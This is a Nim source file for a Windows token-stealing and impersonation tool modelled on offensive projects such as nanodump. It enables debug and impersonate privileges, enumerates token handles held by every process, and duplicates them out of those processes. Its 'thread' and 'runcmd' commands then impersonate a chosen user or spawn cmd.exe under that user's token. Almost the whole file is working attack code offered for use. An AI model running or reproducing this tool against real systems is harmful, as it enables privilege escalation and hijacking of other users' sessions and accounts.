#[
References :
- https://github.com/gtworek/PSBits/blob/master/Misc/TokenStealWithSyscalls.c
- https://github.com/sensepost/impersonate/blob/main/Impersonate/Impersonate/Impersonate.cpp
- https://github.com/fortra/nanodump/blob/main/source/impersonate.c
]#

import winim
import sets
import strutils, strformat
import cligen


proc NtOpenProcessToken(ProcessHandle: HANDLE, DesiredAccess: DWORD, TokenHandle: PHANDLE): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtOpenProcessToken".}
proc NtAdjustPrivilegesToken(TokenHandle: HANDLE, DisableAllPrivileges: BOOLEAN, NewState: ptr TOKEN_PRIVILEGES, BufferLength: DWORD, PreviousState: PVOID, ReturnLength: PDWORD): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtAdjustPrivilegesToken".}
proc NtOpenProcess(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ClientId: PCLIENT_ID): NTSTATUS {.dynlib: "ntdll", importc: "NtOpenProcess".}
proc NtDuplicateToken(ExistingTokenHandle: HANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, EffectiveOnly: BOOLEAN, TokenType: TOKEN_TYPE, NewTokenHandle: PHANDLE): NTSTATUS {.dynlib: "ntdll", importc: "NtDuplicateToken".}
proc NtSetInformationThread(ThreadHandle: HANDLE, ThreadInformationClass: THREADINFOCLASS, ThreadInformation: PVOID, ThreadInformationLength: ULONG): NTSTATUS {.dynlib: "ntdll", importc: "NtSetInformationThread".}
proc CreateProcessAsUserA(hToken: HANDLE, lpApplicationName: LPCSTR, lpCommandLine: LPSTR, lpProcessAttributes: LPSECURITY_ATTRIBUTES, lpThreadAttributes: LPSECURITY_ATTRIBUTES, bInheritHandles: WINBOOL, dwCreationFlags: DWORD, lpEnvironment: LPVOID, lpCurrentDirectory: LPCSTR, lpStartupInfo: LPSTARTUPINFOA, lpProcessInformation: LPPROCESS_INFORMATION): WINBOOL {.stdcall, dynlib: "advapi32.dll", importc.}
proc NtOpenThreadTokenEx(ThreadHandle: HANDLE, DesiredAccess: ACCESS_MASK , OpenAsSelf: BOOLEAN, HandleAttributes: ULONG, TokenHandle: PHANDLE): NTSTATUS {.dynlib: "ntdll", importc: "NtOpenThreadTokenEx".}
proc NtQueryInformationToken(TokenHandle: HANDLE, TokenInformationClass: TOKEN_INFORMATION_CLASS, TokenInformation: PVOID, TokenInformationLength: ULONG, ReturnLength: PULONG): NTSTATUS {.dynlib: "ntdll", importc:"NtQueryInformationToken".}
proc NtDuplicateObject(SourceProcessHandle: HANDLE, SourceHandle: HANDLE, TargetProcessHandle: HANDLE, TargetHandle: PHANDLE, DesiredAccess: ACCESS_MASK, HandleAttributes: ULONG, Options: ULONG): NTSTATUS {.dynlib: "ntdll", importc: "NtDuplicateObject".}
proc RtlConvertSidToUnicodeString(UnicodeString: ptr UNICODE_STRING, Sid: pointer, AllocateDestinationString: BOOLEAN): NTSTATUS {.stdcall, dynlib: "ntdll", importc.}


type
  TokenEntries = tuple[
    pid: int, 
    tokentype: string, 
    tokenhandle: int,
    user: string, 
    integrity: string, 
    impersonation: string
    ] 


proc unicodeStringToStr(u: UNICODE_STRING): string =
  if u.Length == 0 or u.Buffer == nil:
    return ""

  let lengthChars = int32(u.Length div 2)
  let bufferSize = WideCharToMultiByte(CP_UTF8, 0, u.Buffer, lengthChars, nil, 0, nil, nil)
  if bufferSize == 0:
    return ""

  var buf = newString(bufferSize)
  let res = WideCharToMultiByte(CP_UTF8, 0, u.Buffer, lengthChars, cast[LPSTR](addr buf[0]), bufferSize, nil, nil)
  if res == 0:
    return ""

  buf.setLen(bufferSize)
  return buf

proc utf8ToUtf16(s: string): seq[WCHAR] =
    let src: cstring = s
    let len = MultiByteToWideChar(CP_UTF8, 0, src, -1, nil, 0)
    result = newSeq[WCHAR](len)
    discard MultiByteToWideChar(CP_UTF8, 0, src, -1, addr(result[0]), len)


proc convertSidToUnicodeString(pSid: PSID): string = 
  var unicodeSid: UNICODE_STRING
  var status: NTSTATUS
  status = RtlConvertSidToUnicodeString(addr unicodeSid, pSid, TRUE)
  result = $unicodeSid.Buffer
  RtlFreeUnicodeString(addr unicodeSid)


proc getTokenOwnerSID(tokenToCheck: HANDLE): seq[byte] = 
  var neededSize: ULONG = 0
  var status = NtQueryInformationToken(tokenToCheck, 1, nil, 0, addr neededSize)
  let tokenUser = cast[PTOKEN_USER](alloc(neededSize))
  defer: dealloc(tokenUser)
  status = NtQueryInformationToken(tokenToCheck, 1, tokenUser, neededSize, addr neededSize)
  if status != 0:
    echo "getTokenOwnerSID (NtQueryInformationToken) failed: 0x", toHex(cast[int32](status),8)
    quit(1)
  let sidSize = GetLengthSid(tokenUser.User.Sid)
  let sidBuf = newSeq[byte](sidSize)
  copyMem(addr sidBuf[0], tokenUser.User.Sid, sidSize)
  return sidBuf


proc getThreadOwnerSID(threadToCheck: HANDLE): seq[byte] = 
  var tokenHandle: HANDLE
  var status: NTSTATUS
  status = NtOpenThreadTokenEx(threadToCheck, TOKEN_QUERY, TRUE, 0, addr tokenHandle)
  defer: NtClose(tokenHandle)
  if status != 0:
    echo "NtOpenThreadTokenEx failed: 0x", toHex(cast[int32](status),8)
    quit(1)
  return getTokenOwnerSID(tokenHandle)


proc getObjectInfo(tHandle: HANDLE, objInfoClass: OBJECT_INFORMATION_CLASS): string = 
  var 
    objectSize: ULONG = 0

  var status = NtQueryObject(tHandle, objInfoClass, nil, 0 , addr objectSize)
  if status != STATUS_INFO_LENGTH_MISMATCH: 
    echo "First NtQueryObject failed: 0x", toHex(cast[int32](status),8)
    return ""
  var objectInfo = cast[POBJECT_TYPE_INFORMATION](alloc(objectSize))
  defer: dealloc(objectInfo)
  status = NtQueryObject(tHandle, objectTypeInformation, objectInfo, objectSize, addr objectSize)
  if status != STATUS_SUCCESS:
    echo "Second NtQueryObject failed: 0x", toHex(cast[int32](status),8)
    return ""
  return unicodeStringToStr(objectInfo.TypeName)


proc getSIDUsername(pSid: PSID): string = 
  var
    sidType: SID_NAME_USE
    lpName = newWString(256)
    lpDomain = newWString(256)
    dwSize: DWORD = 256
  var status = LookupAccountSidW(NULL, pSid, lpName, addr dwSize, lpDomain, addr dwSize, addr sidType)
  return $nullTerminated(lpName)


proc getIntegrityLevel(tHandle: HANDLE): string = 
  var
    dwSize: ULONG = 8
    status: NTSTATUS

  status = NtQueryInformationToken(tHandle, tokenIntegrityLevel, nil, 0, addr dwSize) 
  let tokenIntegrity = cast[PTOKEN_MANDATORY_LABEL](alloc(dwSize))
  defer: dealloc(tokenIntegrity)
  status = NtQueryInformationToken(tHandle, tokenIntegrityLevel, tokenIntegrity, dwSize, addr dwSize)
  if status != STATUS_SUCCESS:
    echo "Failed to query token info: 0x", toHex(cast[int32](status),8)
    return ""
  var integrityLevel = GetSidSubAuthority(tokenIntegrity.Label.Sid, cast[DWORD]((GetSidSubAuthorityCount(tokenIntegrity.Label.Sid)[] - 1)))[]
  case integrityLevel:
    of SECURITY_MANDATORY_LOW_RID:
      return "Low"
    of SECURITY_MANDATORY_MEDIUM_RID:
      return "Medium"
    of SECURITY_MANDATORY_HIGH_RID:
      return "High"
    of SECURITY_MANDATORY_SYSTEM_RID:
      return "System"
    else:
      return "Unknown RID: 0x" & toHex(integrityLevel)


proc getTokenAttributes(tHandle: HANDLE): tuple[tokentype: string, impersonation: string, integrity: string] =
  var
    dwSize: ULONG = 8
    status: NTSTATUS
    tokenInfo: tuple[tokentype: string, impersonation: string, integrity: string]

  status = NtQueryInformationToken(tHandle, tokenStatistics, nil, 0, addr dwSize) 
  let tokenStats = cast[PTOKEN_STATISTICS](alloc(dwSize))
  defer: dealloc(tokenStats)
  status = NtQueryInformationToken(tHandle, tokenStatistics, tokenStats, dwSize, addr dwSize)
  if status != STATUS_SUCCESS:
    echo "Failed to query token info: 0x", toHex(cast[int32](status),8)
    return ("", "", "")

  if tokenStats.TokenType == tokenPrimary:
    tokenInfo.tokentype = "primary"
    tokenInfo.impersonation = "N/A"
    tokenInfo.integrity = getIntegrityLevel(tHandle)

  elif tokenStats.TokenType == tokenImpersonation:
    tokenInfo.tokentype = "impersonate"
    tokenInfo.integrity = getIntegrityLevel(tHandle)

    status = NtQueryInformationToken(tHandle, tokenImpersonationLevel, nil, 0, addr dwSize) 
    let tokenImpBuf = cast[PSECURITY_IMPERSONATION_LEVEL](alloc(dwSize))
    defer: dealloc(tokenImpBuf)
    status = NtQueryInformationToken(tHandle, tokenImpersonationLevel, tokenImpBuf, dwSize, addr dwSize)
    if status != STATUS_SUCCESS:
      echo "Failed to query token info: 0x", toHex(cast[int32](status),8)
      return ("", "", "")

    var level = cast[SECURITY_IMPERSONATION_LEVEL](tokenImpBuf[])
    case level:
      of securityAnonymous:
        tokenInfo.impersonation = "SecurityAnonymous"
      of securityIdentification:
        tokenInfo.impersonation = "SecurityIdentification"
      of securityImpersonation:
        tokenInfo.impersonation = "SecurityImpersonation"
      of securityDelegation:
        tokenInfo.impersonation = "SecurityDelegation"
      else:
        tokenInfo.impersonation = "Unknown Impersonation Level (" & $level & ")"

  return tokenInfo


proc checkTokenRestriction(tHandle: HANDLE): bool = 
  var
    dwSize: ULONG = 8
    status: NTSTATUS

  status = NtQueryInformationToken(tHandle, tokenRestrictedSids, nil, 0, addr dwSize)
  let pTokenGroups = cast[PTOKEN_GROUPS](alloc(dwSize))
  defer: dealloc(pTokenGroups)
  status = NtQueryInformationToken(tHandle, tokenRestrictedSids, pTokenGroups, dwSize, addr dwSize)
  if status != STATUS_SUCCESS:
    echo "Failed to query token info: 0x", toHex(cast[int32](status),8)
    return false

  return pTokenGroups.GroupCount == 0


proc listAllTokens(): HashSet[TokenEntries] = 
  const
    SystemHandleInformationSize: ULONG = 1024 * 1024 * 10
    SystemHandleInformation = 16
  let currentProcessHandle = cast[HANDLE](LONG_PTR(-1))
  var 
    tokenEntries = initHashSet[TokenEntries]()
    status: NTSTATUS
    returnLength: ULONG
    targetProcessHandle: HANDLE
    dupHandle: HANDLE
    handleTableInformation: PSYSTEM_HANDLE_INFORMATION 

  var oa: OBJECT_ATTRIBUTES
  InitializeObjectAttributes(addr oa, cast[PUNICODE_STRING](nil), 0, cast[HANDLE](nil), cast[PSECURITY_DESCRIPTOR](nil))
  var cid: CLIENT_ID
  var qos: SECURITY_QUALITY_OF_SERVICE

  qos.Length = DWORD(sizeof(SECURITY_QUALITY_OF_SERVICE))
  qos.ImpersonationLevel = 2
  qos.ContextTrackingMode = 0
  qos.EffectiveOnly = FALSE
  oa.Length = ULONG(sizeof(oa))
  oa.SecurityQualityOfService = addr qos


  handleTableInformation = cast[PSYSTEM_HANDLE_INFORMATION](alloc(SystemHandleInformationSize))
  defer: dealloc(handleTableInformation)
  status = NtQuerySystemInformation(SystemHandleInformation, handleTableInformation, SystemHandleInformationSize, &returnLength)
  for handle in 0..<int(handleTableInformation.Count):
    var handleInfo = cast[ptr SYSTEM_HANDLE_ENTRY](cast[ByteAddress](addr handleTableInformation.Handle[0]) + handle * sizeof(SYSTEM_HANDLE_ENTRY))
    cid.UniqueProcess = cast[HANDLE](handleInfo.OwnerPid)
    cid.UniqueThread = cast[HANDLE](nil)
    status = NtOpenProcess(addr targetProcessHandle, PROCESS_DUP_HANDLE, addr oa, addr cid) 
    defer: NtClose(targetProcessHandle)
    if NT_SUCCESS(status):
      status = NtDuplicateObject(targetProcessHandle, cast[HANDLE](handleInfo.HandleValue), currentProcessHandle, addr dupHandle, TOKEN_QUERY or DUPLICATE_SAME_ACCESS, 0, 0);
      defer: NtClose(dupHandle)
      if NT_SUCCESS(status):
        if getObjectInfo(dupHandle, objectTypeInformation) == "Token":
          var tokenSID = getTokenOwnerSID(dupHandle)
          var tokenUsername = getSIDUsername(cast[PSID](addr tokenSID[0]))
          var (tokenType, impersonationLevel, integrityLevel) = getTokenAttributes(dupHandle)
          if checkTokenRestriction(dupHandle):
            tokenEntries.incl((handleInfo.OwnerPid.int, tokenType, handleInfo.HandleValue.int, tokenUsername, integrityLevel, impersonationLevel))

  return tokenEntries


proc setPrivs() = 
  let currentProcessHandle = cast[HANDLE](LONG_PTR(-1))
  var currentTokenHandle: HANDLE
  var tp: TOKEN_PRIVILEGES

  var status = NtOpenProcessToken(currentProcessHandle, TOKEN_ADJUST_PRIVILEGES, addr currentTokenHandle)
  defer: NtClose(currentTokenHandle)
  if not NT_SUCCESS(status):
    echo "NtOpenProcessToken failed: 0x", toHex(cast[int32](status),8)
    quit(-1)

  tp.PrivilegeCount = 1
  tp.Privileges[0].Luid = LUID(LowPart: 0x14, HighPart: 0)
  tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
  echo "[*] Adjusting privileges #1"
  status = NtAdjustPrivilegesToken(currentTokenHandle, FALSE, addr tp, DWORD(sizeof(tp)), nil, nil)
  if status != 0:
    echo "Adding SeDebugPrivilege failed: 0x", toHex(cast[int32](status),8)
    quit(-1)
  
  tp.PrivilegeCount = 1
  tp.Privileges[0].Luid = LUID(LowPart: 0x1D, HighPart: 0)
  tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
  echo "[*] Adjusting privileges #2"
  status = NtAdjustPrivilegesToken(currentTokenHandle, FALSE, addr tp, DWORD(sizeof(tp)), nil, nil)
  if status != 0:
    echo "Adding SeImpersonatePrivilege failed: 0x", toHex(cast[int32](status),8)
    quit(-1)

  #[
  only needed for process spawn from system - not used right now
  tp.PrivilegeCount = 1
  tp.Privileges[0].Luid = LUID(LowPart: 0x03, HighPart: 0)
  tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
  echo "[*] Adjusting privileges #3"
  status = NtAdjustPrivilegesToken(currentTokenHandle, FALSE, addr tp, DWORD(sizeof(tp)), nil, nil)
  if status != 0:
    echo "[!] Adding SeAssignPrimaryTokenPrivilege failed (normal if you're not system): 0x", toHex(cast[int32](status),8)
  ]#


proc list() = 
  setPrivs()
  var tokens = listAllTokens()
  var printable = initHashSet[tuple[pid: int, tokentype: string, user: string, integrity: string, impersonation: string]]()
  echo "[*] Listing tokens details"
  for tok in tokens:
    var key = (tok.pid, tok.user, tok.tokentype, tok.integrity, tok.impersonation)
    if not printable.contains(key):
      echo fmt"[PID: {tok.pid:<5}]  [User: {tok.user:<15}]  [TokenType: {tok.tokenType:<11}]  [Integrity: {tok.integrity:<6}]  [ImpersonationLevel: {tok.impersonation}]"
    printable.incl(key)


proc thread(user: string): string = 
  setPrivs()
  let tokens = listAllTokens()
  var currentToken: TokenEntries
  for tok in tokens:
    if tok.user.toLower() == user.toLower() and
       (tok.tokentype == "primary" or tok.tokentype == "impersonate") and
       (tok.impersonation == "SecurityImpersonation" or tok.impersonation == "SecurityDelegation") and
       tok.integrity != "Low":
      currentToken = tok

  if currentToken.user == "":
    quit("[*] Didn't find any tokens for the selected user")

  echo "[*] Selected token: ", currentToken
  let pid = currentToken.pid
  let tokenHandle = currentToken.tokenhandle
  let 
    currentProcessHandle = cast[HANDLE](LONG_PTR(-1))
    currentThread = cast[HANDLE](LONG_PTR(-2))
  var 
    targetProcessHandle: HANDLE
    targetTokenHandle: HANDLE
    oa: OBJECT_ATTRIBUTES
    cid: CLIENT_ID

  cid.UniqueProcess = cast[HANDLE](pid)
  cid.UniqueThread = cast[HANDLE](nil)
  InitializeObjectAttributes(addr oa, cast[PUNICODE_STRING](nil), 0, cast[HANDLE](nil), cast[PSECURITY_DESCRIPTOR](nil))

  var status = NtOpenProcess(addr targetProcessHandle, PROCESS_DUP_HANDLE, addr oa, addr cid) 
  defer: NtClose(targetProcessHandle)
  if not NT_SUCCESS(status):
    echo "NtOpenProcess failed: 0x", toHex(cast[int32](status),8)
    quit(-1)

  status = NtDuplicateObject(targetProcessHandle, tokenHandle, currentProcessHandle, addr targetTokenHandle, DUPLICATE_SAME_ACCESS, 0, 0);

  var oa2: OBJECT_ATTRIBUTES
  var qos: SECURITY_QUALITY_OF_SERVICE
  var tokenDupHandle: HANDLE

  qos.Length = DWORD(sizeof(SECURITY_QUALITY_OF_SERVICE))
  qos.ImpersonationLevel = 2 # SecurityImpersonation
  qos.ContextTrackingMode = 0
  qos.EffectiveOnly = FALSE
  oa2.Length = ULONG(sizeof(oa2))
  oa2.SecurityQualityOfService = addr qos

  echo "[*] Duplicating target thread token"
  status = NtDuplicateToken(targetTokenHandle, MAXIMUM_ALLOWED, addr oa2, FALSE, tokenImpersonation, addr tokenDupHandle)
  defer: NtClose(tokenDupHandle)
  if status != 0:
    echo "NtDuplicateToken failed: 0x", toHex(cast[int32](status),8)
    quit(-1)

  status = NtSetInformationThread(currentThread, threadImpersonationToken, addr tokenDupHandle, ULONG(sizeof(HANDLE)))
  if status != 0:
    echo "NtSetInformationThread failed: 0x", toHex(cast[int32](status),8)
    quit(-1)

  var threadOwner = getThreadOwnerSID(currentThread)
  echo "[*] Thread Owner : ", convertSidToUnicodeString(cast[PSID](addr threadOwner[0]))



proc runcmd(user: string) = 
  #[
    Work in progess
    - can't spawn process from another user which is also RDP'ed. 
    - can't spawn a process from system shell (elevated with this tool) from another user which is also RDP'ed. 
    Impersonate does seem to have the same issue (0xC0000142)
  ]#
  setPrivs()
  let tokens = listAllTokens()
  var currentToken: TokenEntries
  for tok in tokens:
    if tok.user.toLower() == user.toLower() and
       (tok.tokentype == "primary" or tok.tokentype == "impersonate") and
       (tok.impersonation == "SecurityImpersonation" or tok.impersonation == "SecurityDelegation") and
       tok.integrity != "Low":
      currentToken = tok

  if currentToken.user == "":
    quit("[*] Didn't find any tokens for the selected user")

  echo "[*] Selected token: ", currentToken
  let 
    pid = currentToken.pid
    tokenHandle = currentToken.tokenhandle
    currentProcessHandle = cast[HANDLE](LONG_PTR(-1))
  var 
    targetProcessHandle: HANDLE
    targetTokenHandle: HANDLE
    oa: OBJECT_ATTRIBUTES
    cid: CLIENT_ID

  cid.UniqueProcess = cast[HANDLE](pid)
  cid.UniqueThread = cast[HANDLE](nil)
  InitializeObjectAttributes(addr oa, cast[PUNICODE_STRING](nil), 0, cast[HANDLE](nil), cast[PSECURITY_DESCRIPTOR](nil))

  var status = NtOpenProcess(addr targetProcessHandle, PROCESS_DUP_HANDLE, addr oa, addr cid) 
  defer: NtClose(targetProcessHandle)
  if not NT_SUCCESS(status):
    echo "NtOpenProcess failed: 0x", toHex(cast[int32](status),8)
    quit(-1)

  status = NtDuplicateObject(targetProcessHandle, tokenHandle, currentProcessHandle, addr targetTokenHandle, DUPLICATE_SAME_ACCESS, 0, 0);

  var oa2: OBJECT_ATTRIBUTES
  var qos: SECURITY_QUALITY_OF_SERVICE
  var tokenDupHandle: HANDLE

  qos.Length = DWORD(sizeof(SECURITY_QUALITY_OF_SERVICE))
  qos.ImpersonationLevel = securityImpersonation
  qos.ContextTrackingMode = 0
  qos.EffectiveOnly = FALSE
  oa2.Length = ULONG(sizeof(oa2))
  oa2.SecurityQualityOfService = addr qos


  echo "[*] Duplicating target process token"
  status = NtDuplicateToken(targetTokenHandle, TOKEN_ALL_ACCESS, addr oa2, FALSE, tokenPrimary, addr tokenDupHandle)
  defer: NtClose(tokenDupHandle)
  if status != 0:
    echo "NtDuplicateToken failed: 0x", toHex(cast[int32](status),8)
    quit(-1)

 
  #[
  # this only works with system shell
  proc utf8ToUtf16(s: string): seq[WCHAR] =
    let src: cstring = s  # convert Nim string to C string (null-terminated)
    let len = MultiByteToWideChar(CP_UTF8, 0, src, -1, nil, 0)
    result = newSeq[WCHAR](len)
    discard MultiByteToWideChar(CP_UTF8, 0, src, -1, addr(result[0]), len)

  let cmdLine = utf8ToUtf16("\"C:\\Windows\\System32\\cmd.exe\"")
  let lpCmdLine = cast[LPWSTR](addr(cmdLine[0]))

  var si: STARTUPINFOW
  var pi: PROCESS_INFORMATION
  si.cb = sizeof(STARTUPINFOW).DWORD
  let desktop = utf8ToUtf16("Winsta0\\Default")
  si.lpDesktop = cast[LPWSTR](addr(desktop[0]))
  si.wShowWindow = TRUE
  si.dwFlags = STARTF_USESHOWWINDOW
  var success = CreateProcessAsUserW(
    hToken = tokenDupHandle,
    lpApplicationName = nil,
    lpCommandLine = lpCmdLine,
    lpProcessAttributes = nil,
    lpThreadAttributes = nil,
    bInheritHandles = FALSE,
    dwCreationFlags = 0,
    lpEnvironment = nil,
    lpCurrentDirectory = nil,
    lpStartupInfo = addr(si),
    lpProcessInformation = addr(pi)
  )

  echo success, " ", GetLastError()
  WaitForSingleObject(pi.hProcess, INFINITE)
  CloseHandle(pi.hProcess)
  CloseHandle(pi.hThread)
  ]#

  let cmdLine = utf8ToUtf16("C:\\Windows\\System32\\cmd.exe")
  let lpCmdLine = cast[LPWSTR](addr(cmdLine[0]))

  var si: STARTUPINFOW
  var pi: PROCESS_INFORMATION
  si.cb = DWORD(sizeof(si))

  let success = CreateProcessWithTokenW(
    hToken = tokenDupHandle,
    dwLogonFlags = 0,
    lpApplicationName = nil,
    lpCommandLine = lpCmdLine,
    dwCreationFlags = 0,
    lpEnvironment = nil,
    lpCurrentDirectory = nil,
    lpStartupInfo = addr si,
    lpProcessInformation = addr pi
  )

  if success == 0:
    echo "[!] Failed with error: ", GetLastError()
    quit(-1)
  else:
    echo "[*] Spawned cmd.exe"
    WaitForSingleObject(pi.hProcess, INFINITE)
    CloseHandle(pi.hProcess)
    CloseHandle(pi.hThread)



when isMainModule:
  dispatchMulti(
    [list, doc="List available tokens"],
    [thread, doc="Impersonate thread", help={"user": "Impersonate thread as this user"}],
    [runcmd, doc="Spawn cmd.exe as impersonated user", help={"user": "Spawn cmd.exe as this user"}]
  )



#[
Iterates over processes instead of handles - only shows primary tokens but we can use CreateProcessAsUserW with the token
var processTableBuffer = cast[PSYSTEM_PROCESS_INFORMATION](alloc(SystemProcessInformationSize))
defer: dealloc(processTableBuffer)
status = NtQuerySystemInformation(systemProcessInformation, processTableBuffer, SystemProcessInformationSize, &returnLength)

var pProcInfo = cast[PSYSTEM_PROCESS_INFORMATION](processTableBuffer)

var oa: OBJECT_ATTRIBUTES
InitializeObjectAttributes(addr oa, cast[PUNICODE_STRING](nil), 0, cast[HANDLE](nil), cast[PSECURITY_DESCRIPTOR](nil))
var cid: CLIENT_ID
var qos: SECURITY_QUALITY_OF_SERVICE

qos.Length = DWORD(sizeof(SECURITY_QUALITY_OF_SERVICE))
qos.ImpersonationLevel = 2
qos.ContextTrackingMode = 0
qos.EffectiveOnly = FALSE
oa.Length = ULONG(sizeof(oa))
oa.SecurityQualityOfService = addr qos

while true:
  cid.UniqueProcess = pProcInfo.UniqueProcessId
  status = NtOpenProcess(addr targetProcessHandle, PROCESS_QUERY_INFORMATION, addr oa, addr cid)
  if NT_SUCCESS(status):
    status = NtOpenProcessToken(targetProcessHandle, TOKEN_DUPLICATE or TOKEN_QUERY, addr targetTokenHandle)
    if NT_SUCCESS(status):
      var tokenSID = getTokenOwnerSID(targetTokenHandle)
      var tokenUsername = getSIDUsername(cast[PSID](addr tokenSID[0]))
      var (tokenType, impersonationLevel, integrityLevel) = getTokenInfo(targetTokenHandle)
      if checkTokenRestriction(targetTokenHandle):
        procList.add((pProcInfo.UniqueProcessId, tokenType, tokenUsername, integrityLevel, impersonationLevel))

  if pProcInfo.NextEntryOffset == 0:
    break

  pProcInfo = cast[PSYSTEM_PROCESS_INFORMATION](cast[ptr byte](pProcInfo) + pProcInfo.NextEntryOffset)
]#

